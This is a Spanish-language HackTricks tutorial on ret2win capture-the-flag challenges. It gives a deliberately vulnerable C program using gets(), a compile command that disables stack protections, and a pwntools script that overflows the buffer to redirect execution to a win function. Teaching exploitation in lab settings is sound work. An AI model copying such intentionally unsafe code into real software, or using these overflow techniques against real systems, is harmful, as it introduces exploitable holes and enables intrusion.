# Ret2win

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci贸n B谩sica

Los desaf铆os **Ret2win** son una categor铆a popular en competiciones de **Capture The Flag (CTF)**, especialmente en tareas que involucran **explotaci贸n binaria**. El objetivo es explotar una vulnerabilidad en un binario dado para ejecutar una funci贸n espec铆fica no invocada dentro del binario, a menudo nombrada como `win`, `flag`, etc. Esta funci贸n, al ejecutarse, generalmente imprime una bandera o un mensaje de 茅xito. El desaf铆o generalmente implica sobrescribir la **direcci贸n de retorno** en la pila para desviar el flujo de ejecuci贸n hacia la funci贸n deseada. Aqu铆 tienes una explicaci贸n m谩s detallada con ejemplos:

### Ejemplo en C

Considera un programa simple en C con una vulnerabilidad y una funci贸n `win` que pretendemos llamar:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Para compilar este programa sin protecciones de pila y con **ASLR** deshabilitado, puedes usar el siguiente comando:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Compila el programa como un binario de 32 bits (esto es opcional pero com煤n en desaf铆os CTF).
* `-fno-stack-protector`: Deshabilita las protecciones contra desbordamientos de pila.
* `-z execstack`: Permite la ejecuci贸n de c贸digo en la pila.
* `-no-pie`: Deshabilita el Ejecutable de Posici贸n Independiente para asegurar que la direcci贸n de la funci贸n `win` no cambie.
* `-o vulnerable`: Nombre el archivo de salida como `vulnerable`.

### Exploit en Python usando Pwntools

Para el exploit, utilizaremos **pwntools**, un potente marco de trabajo CTF para escribir exploits. El script de exploit crear谩 un payload para desbordar el b煤fer y sobrescribir la direcci贸n de retorno con la direcci贸n de la funci贸n `win`.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Para encontrar la direcci贸n de la funci贸n `win`, puedes usar **gdb**, **objdump**, u otra herramienta que te permita inspeccionar archivos binarios. Por ejemplo, con `objdump`, podr铆as usar:
```sh
objdump -d vulnerable | grep win
```
Este comando mostrar谩 el ensamblado de la funci贸n `win`, incluyendo su direcci贸n de inicio.

El script de Python env铆a un mensaje cuidadosamente elaborado que, al ser procesado por la `vulnerable_function`, desborda el b煤fer y sobrescribe la direcci贸n de retorno en la pila con la direcci贸n de `win`. Cuando `vulnerable_function` retorna, en lugar de regresar a `main` o salir, salta a `win`, y se imprime el mensaje.

## Protecciones

* [**PIE**](../common-binary-protections-and-bypasses/pie/) **debe estar deshabilitado** para que la direcci贸n sea fiable en ejecuciones sucesivas, de lo contrario la direcci贸n donde se almacenar谩 la funci贸n no ser谩 siempre la misma y se necesitar铆a alguna filtraci贸n para averiguar d贸nde se encuentra la funci贸n `win`. En algunos casos, cuando la funci贸n que causa el desbordamiento es `read` o similar, se puede hacer un **Sobrescribir Parcial** de 1 o 2 bytes para cambiar la direcci贸n de retorno y que sea la funci贸n `win`. Debido a c贸mo funciona ASLR, los 煤ltimos tres nibbles hexadecimales no se aleatorizan, por lo que hay una **probabilidad de 1/16** (1 nibble) de obtener la direcci贸n de retorno correcta.
* Los [**Canarios de Pila**](../common-binary-protections-and-bypasses/stack-canaries/) tambi茅n deben estar deshabilitados o la direcci贸n de retorno comprometida de EIP nunca ser谩 seguida.

## Otros ejemplos y Referencias

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 bits, sin ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bits con ASLR, con una filtraci贸n de la direcci贸n binaria
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bits, sin ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bits, sin ASLR, doble desbordamiento peque帽o, primero para desbordar la pila y aumentar el tama帽o del segundo desbordamiento
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bits, relro, sin canario, nx, sin pie, cadena de formato para sobrescribir la direcci贸n `fflush` con la funci贸n `win` (ret2win)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bits, nx, nada m谩s, sobrescribir parcial de EIP (1 byte) para llamar a la funci贸n `win`
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bits, nx, nada m谩s, sobrescribir parcial de EIP (1 byte) para llamar a la funci贸n `win`
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* El programa solo valida el 煤ltimo byte de un n煤mero para verificar el tama帽o de la entrada, por lo tanto es posible agregar cualquier tama帽o siempre que el 煤ltimo byte est茅 dentro del rango permitido. Luego, la entrada crea un desbordamiento de b煤fer explotado con un ret2win.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bits, relro, sin canario, nx, pie. Sobrescribir parcial para llamar a la funci贸n `win` (ret2win)
